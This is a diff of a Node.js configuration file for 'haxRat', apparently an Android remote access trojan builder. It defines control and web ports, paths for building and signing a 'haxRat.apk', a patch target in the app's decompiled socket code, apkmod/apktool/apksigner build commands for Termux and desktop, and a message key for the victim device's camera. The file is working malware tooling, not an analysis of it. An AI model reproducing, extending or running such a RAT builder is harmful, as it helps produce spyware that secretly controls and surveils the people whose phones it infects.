@@ -6,10 +6,14 @@ exports.web_port = 22533;
 exports.control_port = 22222;
 
 // Paths
-//exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
-//exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/haxRat.apk')
-exports.apkBuildPath = "/data/data/com.termux/files/home/haxrat/build.apk"
-exports.apkSignedBuildPath = "/data/data/com.termux/files/home/haxrat/haxRat.apk"
+
+exports.termux = '/data/data/com.termux/files/home'
+exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
+exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/haxRat.apk')
+
+exports.termuxApkBuildPath = exports.termux + '/haxrat/build.apk'
+exports.termuxApkSignedBuildPath = exports.termux + '/haxrat/haxRat.apk'
+
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
 
@@ -18,8 +22,12 @@ exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/hax4us/haxrat/IOSocket.smali');
 
-exports.buildCommand = 'apkmod' + ' -r "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'apksigner -p android keystore "' + exports.apkBuildPath + '" "' + exports.apkSignedBuildPath + '"' ; // <-- fix output
+exports.termuxBuildCommand = 'apkmod' + ' -r "' + exports.smaliPath + '" -o "' + exports.termuxApkBuildPath + '"';
+exports.termuxSignCommand = 'apksigner -p android keystore "' + exports.termuxApkBuildPath + '" "' + exports.termuxApkSignedBuildPath + '"' ;
+
+exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
+exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; 
+
 
 exports.messageKeys = {
     camera: '0xCA',
